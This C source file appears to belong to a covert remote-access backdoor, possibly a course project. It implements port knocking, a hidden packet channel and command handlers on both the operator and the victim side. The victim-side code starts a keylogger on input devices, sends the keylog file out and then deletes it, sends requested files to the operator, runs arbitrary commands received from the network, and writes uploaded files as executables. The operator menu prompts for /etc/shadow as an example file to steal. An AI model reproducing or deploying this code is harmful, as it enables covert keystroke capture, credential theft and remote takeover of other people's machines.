#include "utils.h"
#include "protocol.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "networking.h"

#ifdef CLIENT_BUILD
#include "keylogging/keylogger.h"
#include "process_launcher/process_launcher.h"
#endif


void initiate_port_knocking(const struct server_options * server_options) {
    send_port_knock(server_options->client_fd, server_options->host, server_options->client_ip_address, PORT_KNOCKING_PORT);
}

int calculate_data_packet_count(const struct session_info * session_info) {
    return session_info->packet_counter - COMMAND_TRIGGER_THRESHOLD;
}

void clear_process_packets(struct session_info * session_info) {
    free_linked_list(session_info->head);
    session_info->head = NULL;
    session_info->data_counter = 0;
    session_info->packet_counter = 0;
}

static int sequence_greater_than(const uint16_t a, const uint16_t b) {
    // Check for wrap around if numbers differ more than half
    const uint16_t half = 0x8000; // 32768
    if (a == b) return 0;
    const uint16_t forward_dist = (uint16_t)(a - b);
    return forward_dist < half;
}

void sort_linked_list(struct packet_data * head) {
    if (head == NULL || head->next == NULL) return;

    int swapped;
    const struct packet_data * last = NULL;

    do {
        swapped = 0;
        struct packet_data * current = head;

        while (current->next != last) {
            if (sequence_greater_than(current->sequence_number, current->next->sequence_number)) {
                const uint16_t tmp_seq  = current->sequence_number;
                const uint16_t tmp_data = current->data;

                current->sequence_number = current->next->sequence_number;
                current->data            = current->next->data;

                current->next->sequence_number = tmp_seq;
                current->next->data            = tmp_data;

                swapped = 1;
            }
            current = current->next;
        }
        last = current;
    } while (swapped);
}

bool handle_command_codes(struct session_info * session_info, const struct packet_data * node) {
    enum command_codes encountered_command_code = {};
    bool is_command_code = true;


    const uint8_t first_byte  = (node->data >> 8) & 0xFF;
    const uint8_t last_byte = node->data & 0xFF;

    if (first_byte != last_byte) {
        return false;
    }

    switch (last_byte) {
        case START_KEYLOGGER:
            log_message("Start Keylogger\n");
            encountered_command_code = START_KEYLOGGER;
            break;
        case STOP_KEYLOGGER:
            log_message("Stop Keylogger\n");
            encountered_command_code = STOP_KEYLOGGER;
            break;
        case RESPONSE:
            log_message("Handling Response");
            encountered_command_code = RESPONSE;
            break;
        case GET_KEYBOARDS:
            log_message("Getting Keyboards\n");
            encountered_command_code = GET_KEYBOARDS;
            break;
        case RUN_PROGRAM:
            log_message("Running Program\n");
            encountered_command_code = RUN_PROGRAM;
            break;
        case DISCONNECT:
            log_message("Handling Disconnect\n");
            encountered_command_code = DISCONNECT;
            break;
        case SEND_FILE:
            log_message("Send File\n");
            encountered_command_code = SEND_FILE;
            break;
        case RECEIVE_FILE:
            log_message("Receiving File\n");
            encountered_command_code = RECEIVE_FILE;
            break;
        default:
            // log_message("Default\n");
            is_command_code = false;
            break;
    }

    if (is_command_code) {
        if (session_info->last_command_code == encountered_command_code) {
            session_info->command_counter++;
        } else {
            session_info->last_command_code = encountered_command_code;
            session_info->command_counter = 1;
        }

        log_message("Session info counter: %d, code: %d", session_info->command_counter, encountered_command_code);

        // If the counter hits 2 then execute the corresponding function
        if (session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
            log_message("Triggered function call: counter %d, code: %d", session_info->command_counter, encountered_command_code);
            session_info->command_counter = 0;

            sort_linked_list(session_info->head);

            for (int i = 0; command_handler_functions[i].key != 0; i++) {
                if (command_handler_functions[i].key == encountered_command_code) {
                    command_handler_functions[i].handler(session_info);
                    return true;
                }
            }
        }

    }

    return false;
}

void handle_packet_data(struct session_info * session_info, struct packet_data * node) {
    if (session_info->head == NULL) {
        session_info->head = node;
        handle_command_codes(session_info, node);
        session_info->packet_counter++;
        return;
    }

    struct packet_data * packet_data = session_info->head;

    // Traverse to the last filled node
    while (packet_data->next != NULL) {
        packet_data = packet_data->next;
    }

    // Add data
    packet_data->next = node;
    session_info->packet_counter++;

    const int clear_linked_list = handle_command_codes(session_info, node);

    if (clear_linked_list) {
        log_message("Clearing linked list");
        clear_process_packets(session_info);
    }
}

/**
 *
 *  CLIENT COMMAND HANDLERS
 *
**/

// NOLINTNEXTLINE
void start_keylogger(struct session_info * session_info) {
    log_message("Starting Keylogger");
#ifdef CLIENT_BUILD
    const struct packet_data * packet_data = session_info->head;

    session_info->device_path = malloc(MESSAGE_BUFFER_LENGTH);
    int device_path_len = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;

        if (first_byte == START_KEYLOGGER && second_byte == START_KEYLOGGER) {
            break;
        }

        if (device_path_len < MESSAGE_BUFFER_LENGTH - 2) {
            if (first_byte == 0) {
                session_info->device_path[device_path_len++] = (char)second_byte;
            } else {
                session_info->device_path[device_path_len++] = (char)first_byte;
                session_info->device_path[device_path_len++] = (char)second_byte;
            }
        }

        packet_data = packet_data->next;
    }

    while (device_path_len > 0 && (session_info->device_path[device_path_len - 1] == '\0' || session_info->device_path[device_path_len - 1] == ' ')) {
        device_path_len--;
    }

    session_info->device_path[device_path_len] = '\0';

    log_message("Provided Device Path: %s", session_info->device_path);
    if (!session_info->run_keylogger) {
        session_info->run_keylogger = true;
        pthread_create(&session_info->keylogger_thread, NULL, capture_keys, session_info);
    }
#endif
}

void stop_keylogger(struct session_info * session_info) {
    log_message("Stoping Keylogger");
#ifdef CLIENT_BUILD
    session_info->run_keylogger = false;

    pthread_join(session_info->keylogger_thread, NULL);

    // Send the keylog file
    FILE * log_file = fopen(KEYLOG_FILE_PATH, "w");
    if (log_file == NULL) {
        log_message("Failed to open keylog file: %s", KEYLOG_FILE_PATH);
    }
    char * file_buffer = malloc(MESSAGE_BUFFER_LENGTH);
    if (file_buffer == NULL) {
        log_message("Failed to allocate file buffer", KEYLOG_FILE_PATH);
        fclose(log_file);
        return;
    }

    // Send over the filename and the FILENAME command
    send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, KEYLOG_FILE_PATH);
    usleep(500000);
    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, FILENAME);

    size_t chunk_count = 0;
    size_t chunk_bytes;
    while ((chunk_bytes = fread(file_buffer, 1, MESSAGE_BUFFER_LENGTH - 1, log_file)) > 0) {
        file_buffer[chunk_bytes] = '\0';
        send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, file_buffer);
        chunk_count++;
        log_message("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
    }

    log_message("Keylog File transfer complete. Sent %zu chunks\n", chunk_count);

    fclose(log_file);
    free(file_buffer);

    usleep(500000);
    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, SEND_FILE);

    // Delete keylog file
    if (remove(KEYLOG_FILE_PATH) != 0) {
        perror("Error removing keylog");
    }
#endif
}

// NOLINTNEXTLINE
void process_send_file(struct session_info * session_info) {
    print_linked_list(session_info->head);

    const int data_packet_to_read = calculate_data_packet_count(session_info);
    log_message("Data packets to read %d", data_packet_to_read);
    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);

    const struct packet_data * packet_data = session_info->head;

    char filename[256] = {0};
    int filename_len = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        // log_message("First Byte %d", first_byte);
        // log_message("Second Byte %d", second_byte);

        if (first_byte == FILENAME && second_byte == FILENAME) {
            packet_data = packet_data->next;
            break;
        }

        if (filename_len < (int)sizeof(filename) - 2) {
            if (first_byte == 0) {
                filename[filename_len++] = (char)second_byte;
            } else {
                filename[filename_len++] = (char)first_byte;
                filename[filename_len++] = (char)second_byte;
            }
        }

        packet_data = packet_data->next;
    }

    if (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        if (first_byte == FILENAME && second_byte == FILENAME) {
            packet_data = packet_data->next;
        }
    }

    while (filename_len > 0 && (filename[filename_len - 1] == '\0' || filename[filename_len - 1] == ' ')) {
        filename_len--;
    }
    filename[filename_len] = '\0';
    log_message("Filename: %s", filename);

    const int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) {
        log_message("Failed to open file: %s", filename);
        return;
    }
    FILE * file = fdopen(fd, "wb");
    if (file == NULL) {
        log_message("Failed to open file: %s", filename);
        close(fd);
        return;
    }

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        // log_message("First Byte %d", first_byte);
        // log_message("Second Byte %d", second_byte);

        if (first_byte == SEND_FILE || second_byte == SEND_FILE) {
            break;
        }

        if (first_byte == 0) {
            fwrite(&second_byte, 1, 1, file);
        } else {
            fwrite(&first_byte,  1, 1, file);
            fwrite(&second_byte, 1, 1, file);
        }

        packet_data = packet_data->next;
    }

    fclose(file);
    log_message("File saved: %s", filename);
}

// NOLINTNEXTLINE
void process_receive_file(struct session_info * session_info) {
    print_linked_list(session_info->head);
    const size_t message_length = MESSAGE_BUFFER_LENGTH;
    const struct packet_data * packet_data = session_info->head;
    char filename[256] = {0};
    int filename_len = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        log_message("First Byte %d", first_byte);
        log_message("Second Byte %d", second_byte);

        if (first_byte == FILENAME && second_byte == FILENAME) {
            break;
        }

        if (filename_len < (int)sizeof(filename) - 2) {
            if (first_byte == 0) {
                filename[filename_len++] = (char)second_byte;
            } else {
                filename[filename_len++] = (char)first_byte;
                filename[filename_len++] = (char)second_byte;
            }
        }

        packet_data = packet_data->next;
    }

    while (filename_len > 0 && (filename[filename_len - 1] == '\0' || filename[filename_len - 1] == ' ')) {
        filename_len--;
    }

    filename[filename_len] = '\0';

    log_message("Filename: %s", filename);
#ifdef CLIENT_BUILD
    FILE * file = fopen(filename, "rb");
    if (file == NULL) {
        fprintf(stderr, "Failed to open file: %s\n", filename);
        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, "Failed to open file");
        send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
        return;
    }

    char * file_buffer = malloc(message_length);
    if (file_buffer == NULL) {
        fprintf(stderr, "Failed to allocate file buffer\n");
        fclose(file);
        return;
    }

    // Send over the filename and the FILENAME command
    send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, filename);

    usleep(500000);
    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);

    size_t chunk_count = 0;
    size_t chunk_bytes;
    while ((chunk_bytes = fread(file_buffer, 1, message_length - 1, file)) > 0) {
        file_buffer[chunk_bytes] = '\0';
        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
        chunk_count++;
        printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
        fflush(stdout);
    }

    printf("File transfer complete. Sent %zu chunks\n", chunk_count);
    fflush(stdout);

    fclose(file);
    free(file_buffer);

    usleep(500000);
    send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);

#endif

}

// NOLINTNEXTLINE
void process_run_command(struct session_info * session_info) {
    print_linked_list(session_info->head);

    const int data_packet_to_read = calculate_data_packet_count(session_info);
    log_message("Data packets to read %d", data_packet_to_read);
    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);

    const struct packet_data * packet_data = session_info->head;

    char command[MESSAGE_BUFFER_LENGTH] = {0};
    int command_len = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;

        log_message("First Byte %d", first_byte);
        log_message("Second Byte %d", second_byte);

        if (first_byte == RUN_PROGRAM && second_byte == RUN_PROGRAM) {
            break;
        }

        if (command_len < (int)sizeof(command) - 2) {
            if (first_byte == 0) {
                command[command_len++] = (char)second_byte;
            } else {
                command[command_len++] = (char)first_byte;
                command[command_len++] = (char)second_byte;
            }
        }

        packet_data = packet_data->next;
    }

    while (command_len > 0 && (command[command_len - 1] == '\0' || command[command_len - 1] == ' ')) {
        command_len--;
    }

    command[command_len] = '\0';

    log_message("Command: %s", command);

    #ifdef CLIENT_BUILD
        run_process(session_info, command);
    #endif

}

// NOLINTNEXTLINE
void handle_disconnect(struct session_info * session_info) {
    connection_loop = false;
}

/**
 *
 *  CENTRAL MENU COMMAND HANDLERS
 *
**/

// NOLINTNEXTLINE
void send_start_keylogger(struct server_options * server_options) {
    const size_t device_path_length = MESSAGE_BUFFER_LENGTH;
    char * device_path = malloc(device_path_length);
    long bytes_read = 0;

    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        free(device_path);
        return;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        free(device_path);
        return;
    }

    char discard;
    while (read(STDIN_FILENO, &discard, 1) > 0) {
        if (discard == '\n') break;
    }

    fprintf(stdout, "Enter the device path to log (i.e. /dev/input/event9): ");
    fflush(stdout);

    bytes_read = read(STDIN_FILENO, device_path, device_path_length);
    if (bytes_read > 0) {
        device_path[bytes_read - 1] = '\0';
        printf("Listening to device path: %s\n", device_path);
        fflush(stdout);

        // Send over the filename and the FILENAME command
        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, device_path);
        usleep(500000);
        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, START_KEYLOGGER);

        fflush(stdout);
    }

    free(device_path);

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
    }
}


// NOLINTNEXTLINE
void send_stop_keylogger(struct server_options * server_options) {
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, STOP_KEYLOGGER);
}

// NOLINTNEXTLINE
void send_get_keyboards(struct server_options * server_options) {
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, GET_KEYBOARDS);
}

// Disconnect
// NOLINTNEXTLINE
void send_disconnect(struct server_options * server_options) {
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, DISCONNECT);
}

// NOLINTNEXTLINE
void send_file(struct server_options * server_options) {
    const size_t message_length = MESSAGE_BUFFER_LENGTH;
    char * message = malloc(message_length);
    long bytes_read = 0;

    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        free(message);
        return;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        free(message);
        return;
    }

    char discard;
    while (read(STDIN_FILENO, &discard, 1) > 0) {
        if (discard == '\n') break;
    }

    fprintf(stdout, "Enter the filename to send (i.e. /home/text.txt): ");
    fflush(stdout);

    bytes_read = read(STDIN_FILENO, message, message_length);
    if (bytes_read > 0) {
        message[bytes_read - 1] = '\0';
        printf("Reading file: %s\n", message);
        fflush(stdout);

        FILE * file = fopen(message, "rb");
        if (file == NULL) {
            fprintf(stderr, "Failed to open file: %s\n", message);
            free(message);
            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
            return;
        }

        char * file_buffer = malloc(message_length);
        if (file_buffer == NULL) {
            fprintf(stderr, "Failed to allocate file buffer\n");
            fclose(file);
            free(message);
            fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
            return;
        }

        // Send over the filename and the FILENAME command
        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);

        usleep(500000);
        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);

        size_t chunk_count = 0;
        size_t chunk_bytes;
        while ((chunk_bytes = fread(file_buffer, 1, message_length - 1, file)) > 0) {
            file_buffer[chunk_bytes] = '\0';
            send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, file_buffer);
            chunk_count++;
            printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
            fflush(stdout);
        }

        printf("File transfer complete. Sent %zu chunks\n", chunk_count);
        fflush(stdout);

        fclose(file);
        free(file_buffer);
    }

    free(message);

    usleep(500000);
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, SEND_FILE);

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
    }
}

void send_watch(int fd, enum FILE_TYPE file_type, char * path) {

}

// Run program
void send_run_program(const struct server_options * server_options) {
    const size_t message_length = MESSAGE_BUFFER_LENGTH;
    char * message = malloc(message_length);
    long bytes_read = 0;

    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        free(message);
        return;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        free(message);
        return;
    }

    char discard;
    while (read(STDIN_FILENO, &discard, 1) > 0) {
        if (discard == '\n') break;
    }

    fprintf(stdout, "Enter the command to run on remote (i.e. \"ls -al\"): ");
    fflush(stdout);

    bytes_read = read(STDIN_FILENO, message, message_length);
    if (bytes_read > 0) {
        message[bytes_read - 1] = '\0';
        printf("Sending command: %s\n", message);
        fflush(stdout);

        // Send over the command and the RUN_PROGRAM command
        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);

        usleep(500000);
        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RUN_PROGRAM);
        fflush(stdout);
    }

    free(message);

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
    }
}

// Uninstall
void send_uninstall(int fd) {

}

void send_receive_file(const struct server_options * server_options) {
    const size_t message_length = MESSAGE_BUFFER_LENGTH;
    char * message = malloc(message_length);
    long bytes_read = 0;

    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags == -1) {
        fprintf(stderr, "F_GETFL on STDIN\n");
        free(message);
        return;
    }

    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
        free(message);
        return;
    }

    char discard;
    while (read(STDIN_FILENO, &discard, 1) > 0) {
        if (discard == '\n') break;
    }

    fprintf(stdout, "Enter the filename to receive (i.e. /etc/shadow): ");
    fflush(stdout);

    bytes_read = read(STDIN_FILENO, message, message_length);
    if (bytes_read > 0) {
        message[bytes_read - 1] = '\0';
        log_message("Receiving file from remote: %s\n", message);
        fflush(stdout);
        // Send over the filename and the FILENAME command
        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
        usleep(500000);
        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
    }

    free(message);

    usleep(500000);
    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RECEIVE_FILE);

    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
        fprintf(stderr, "F_SETFL on STDIN\n");
    }
}

// NOLINTNEXTLINE
void handle_get_keyboards(struct session_info * session_info) {
#ifdef CLIENT_BUILD
    discover_keyboards(session_info);
#endif
}

// NOLINTNEXTLINE
void handle_response(struct session_info * session_info) {
    print_linked_list(session_info->head);

    const int data_packet_to_read = calculate_data_packet_count(session_info);
    log_message("Data packets to read %d", data_packet_to_read);
    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);

    const struct packet_data * packet_data = session_info->head;

    char response[RESPONSE_BUFFER_LENGTH] = {0};
    int response_length = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;

        log_message("First Byte %d", first_byte);
        log_message("Second Byte %d", second_byte);

        if (first_byte == RESPONSE && second_byte == RESPONSE) {
            break;
        }

        if (response_length < (int)sizeof(response) - 2) {
            if (first_byte == 0) {
                response[response_length++] = (char)second_byte;
            } else {
                response[response_length++] = (char)first_byte;
                response[response_length++] = (char)second_byte;
            }
        }

        packet_data = packet_data->next;
    }

    while (response_length > 0 && (response[response_length - 1] == '\0' || response[response_length - 1] == ' ')) {
        response_length--;
    }

    response[response_length] = '\0';

    log_message("Response received:\n%s", response);
    fflush(stdout);
}